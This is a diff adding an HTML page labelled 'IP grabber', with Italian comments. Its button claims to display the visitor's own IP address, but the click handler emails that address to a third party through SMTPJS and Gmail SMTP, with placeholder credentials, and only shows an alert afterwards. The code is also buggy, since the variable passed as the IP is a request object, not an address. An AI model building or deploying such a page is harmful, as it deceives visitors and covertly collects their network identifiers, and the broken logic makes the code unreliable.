@@ -1,0 +1,68 @@
+<!DOCTYPE html> 
+<html> 
+  
+<head> 
+  <title>IP grabber</title> 
+  
+  <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"> </script> 
+  <script src= "https://smtpjs.com/v3/smtp.js"> </script> 
+
+  <script>    
+    function sendEmail(ip) 
+    { 
+      Email.send({ 
+        Host: "smtp.gmail.com", 
+        Username: "indirizzo email del mittente", 
+        Password: "password del mittente", 
+        To: 'indirizzo email del ricevitore', 
+        From: "indirizzo email del mittente", 
+        Subject: "oggetto della mail", 
+        Body: ip,}) // qua è contenuto l'indirizzo IP "catturato" 
+
+        .then(function (message) { 
+          $.getJSON("https://api.ipify.org?format=json", 
+        function(data) {alert(data.ip);})
+        }); 
+    } 
+  </script>
+
+  <style>
+      #box { 
+        width:360px;
+        height:50px;
+        background:rgb(75, 75, 75);
+        color:white;
+        font-size: 20px;
+        margin:5px;
+        border-radius:15px;
+        -webkit-border-radius:5px;
+        -o-transition-property:width,height,-o-transform,font-size,opacity;
+        -o-transition-duration:1s,1s,1s,1s,1s,1s;
+        -moz-transition-property:width,height,-o-transform,font-size,opacity;
+        -moz-transition-duration:1s,1s,1s,1s,1s,1s;
+        transition-property:width,height,transform,font-size,opacity;
+        transition-duration:1s,1s,1s,1s,1s,1s;}
+
+        
+      #box:hover{
+        opacity:1;
+        background: rgb(75, 75, 75);
+        width:550px;
+        height:200x;
+        font-size:30px;
+        color:white;}
+  </style>
+
+</head> 
+  
+
+<body> 
+
+        <h1>inserisci qua quello che vuoi</h1>
+
+        <script>var ip = $.getJSON("https://api.ipify.org?format=json", function(data) {return(data.ip);});</script>
+        <input type="button" id = "box" value="clicca qua per far apparire il tuo indirizzo IP!" onclick="sendEmail(ip)" />
+
+</body> 
+  
+</html> 
